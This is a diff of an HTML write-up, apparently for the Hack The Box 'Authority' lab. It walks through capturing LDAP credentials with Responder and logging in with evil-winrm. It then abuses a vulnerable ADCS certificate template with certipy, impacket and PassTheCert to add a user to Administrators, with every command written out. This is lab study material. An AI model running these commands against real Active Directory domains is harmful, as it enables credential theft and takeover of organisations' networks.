@@ -47,14 +47,12 @@
 <img src="decrypt.png" alt="decrypt" style="max-width: 100%; height: auto;">
 <p>However, I did not find a valid use for the password in general. However, I did find a valid use for it in the "pwm_admin_password", since I had the corresponding user. I realized that I could use the same password.</p>
 <pre>
-<code>
-$ANSIBLE_VAULT;1.1;AES256
+<code>$ANSIBLE_VAULT;1.1;AES256
 31356338343963323063373435363261323563393235633365356134616261666433393263373736
 3335616263326464633832376261306131303337653964350a363663623132353136346631396662
 38656432323830393339336231373637303535613636646561653637386634613862316638353530
 3930356637306461350a316466663037303037653761323565343338653934646533663365363035
-6531
-</code>
+6531</code>
 </pre>
 <p>So I have the user "svc_pwm" and the password "pWm_@dm!N_!23". At this point, I decided to go to port "8443", which was associated with "pwm", a self-service web portal for any LDAP user accounts.</p>
 <img src="pwm_access.png" alt="pwm access" style="max-width: 100%; height: auto;">
@@ -65,17 +63,13 @@ $ANSIBLE_VAULT;1.1;AES256
 <img src="edit_configuration.png" alt="edit configuration" style="max-width: 100%; height: auto;">
 <p>We put ourselves in listening mode by "responder":</p>
 <pre>
-<code>
-sudo responder -I tun0
-</code>
+<code>sudo responder -I tun0</code>
 </pre>
 <p>Subsequently, I clicked on "Test LDAP Profile". The authentication should come up and get the credentials of the user "svc_ldap".</p>
 <br>
 <p>Since WinRM was open on the default port 5985, I connected using "evil-winrm" with the credentials obtained.</p>
 <pre>
-<code>
-evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
-</code>
+<code>evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'</code>
 </pre>
 <p>After a period of enumeration, listing ADCS in an AD can sound good, I proceeded to list ADCS. Active Directory Certificate Services (ADCS) is a set of services in the Microsoft Windows Server environment that enable the organization, creation, distribution and centralized management of digital certificates. These digital certificates are essential for establishing secure authentication.</p> 
 <pre><code>certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -vulnerable -text -stdout</pre></code>
@@ -84,41 +78,29 @@ evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
 <img src="ADCS_info.png" alt="ADCS Info" style="max-width: 100%; height: auto;">
 <p>To exploit this vulnerability, I will first create a computer in the domain:</p>
 <pre>
-<code>
-impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name computerfismathack$ -computer-pass password
-</code>
+<code>impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name computerfismathack$ -computer-pass password</code>
 </pre>
 <p>After creating the computer in the domain, I will request a certificate using the newly created computer account:</p>
 <pre>
-<code>
-echo "10.10.11.222 authority.authority.htb" | sudo tee -a /etc/hosts
-certipy req -u 'computerfismathack$' -p 'password' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dc-ip 10.10.11.222 -dns authority.authority.htb
-</code>
+<code>echo "10.10.11.222 authority.authority.htb" | sudo tee -a /etc/hosts
+certipy req -u 'computerfismathack$' -p 'password' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dc-ip 10.10.11.222 -dns authority.authority.htb</code>
 </pre>
 <p>Subsequently, we will create two new certificates, one without private key and the other without including the certificate.</p>
 <pre>
-<code>
-certipy cert -pfx administrator_authority.pfx -nokey -out authority.crt
-certipy cert -pfx administrator_authority.pfx -nocert -out authority.key
-</code>
+<code>certipy cert -pfx administrator_authority.pfx -nokey -out authority.crt
+certipy cert -pfx administrator_authority.pfx -nocert -out authority.key</code>
 </pre>
 <p>I will make use of "PassTheCert", for this, I proceed to install it:</p>
 <pre>
-<code>
-wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py
-</code>
+<code>wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/main/Python/passthecert.py</code>
 </pre>
 <p>Subsequently</p>
 <pre>
-<code>
-python3 passthecert.py -action ldap-shell -crt authority.crt -key authority.key -domain authority.htb -dc-ip 10.10.11.222
-</code>
+<code>python3 passthecert.py -action ldap-shell -crt authority.crt -key authority.key -domain authority.htb -dc-ip 10.10.11.222</code>
 </pre>
 <p>Being inside the LDAP shell, I run the following command, which indicates that I want to add the user "svc_ldap" to the "Administrators" group:</p>
 <pre>
-<code>
-add_user_to_group svc_ldap Administrators
-</code>
+<code>add_user_to_group svc_ldap Administrators</code>
 </pre>
 <p>Now, you are an administrator with the user "svc_ldap".</p>
 
